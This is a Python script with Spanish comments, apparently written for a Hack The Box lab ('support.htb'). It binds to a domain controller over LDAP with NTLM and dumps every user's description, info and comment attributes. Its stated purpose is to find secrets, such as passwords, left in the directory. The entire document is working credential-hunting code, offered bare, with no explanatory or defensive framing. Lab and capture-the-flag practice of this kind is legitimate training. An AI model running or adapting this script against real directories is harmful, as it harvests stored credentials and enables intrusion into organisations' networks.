#!/usr/bin/env python3
"""Consulta atributos LDAP completos (description/info/comment) de todos
los usuarios del dominio — busca secretos documentados en el directorio."""
import sys
from ldap3 import Server, Connection, NTLM

DC_IP = '10.129.107.170'
DOMAIN = 'support.htb'

def dump(user: str, password: str):
    s = Server(DC_IP, port=389)
    c = Connection(s, user=f'{DOMAIN.upper()}\\{user}', password=password,
                   authentication=NTLM)
    if not c.bind():
        sys.exit(f'[-] Bind fallido como {user}')
    print(f'[+] Bind OK como {user}')
    c.search(f'DC={DOMAIN.replace(".", ",DC=")}', '(objectClass=user)',
             attributes=['sAMAccountName', 'description', 'info', 'comment'])
    for e in c.entries:
        blob = ' '.join(str(e[a].value) for a in ('description', 'info', 'comment')
                        if e[a] and e[a].value).strip()
        if blob:
            print(f'[!] {e.sAMAccountName.value}: {blob}')

if __name__ == '__main__':
    dump(sys.argv[1], sys.argv[2])
